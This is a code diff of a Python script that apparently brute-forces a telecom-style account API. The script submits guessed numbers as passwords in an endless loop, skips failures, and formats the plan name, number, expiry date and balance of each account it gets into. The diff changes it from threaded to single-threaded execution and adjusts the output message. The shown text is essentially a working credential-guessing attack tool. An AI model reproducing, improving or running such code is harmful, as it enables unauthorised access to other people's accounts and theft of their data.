@@ -64,7 +64,7 @@ def send_order():
             "password": num
         }
         res = requests.post(url, headers=headers, json=data).json()
-        message = f'PlanName:: :{res["PlanName"]}\nNumber : `{num}`\nExpiryDate : {res["ExpiryDate"]}\nBalance : {res["Balance"]}\n'
+        message = f'PlanName:: :{res["PlanName"]}\nNumber : `{num}`,\nExpiryDate : {res["ExpiryDate"]}\nBalance : {res["Balance"]}\n'
         
         if res['ErrorDescription'] == 'dial does not match the password':pass
             #print(f"wrong number : {num}")
@@ -76,11 +76,11 @@ def send_order():
             
     except :pass
          #print(f"wrong number : {num}")
-from threading import Thread as t
+#from threading import Thread as t
 
  
 while True:
-	for i in range(2):
-		t(args="",target=send_order).start()
-#	send_order()	
+	#for i in range(2):
+	#	t(args="",target=send_order).start()
+	send_order()	
 #	threading.Thread(target=send_order,args=[]).start()
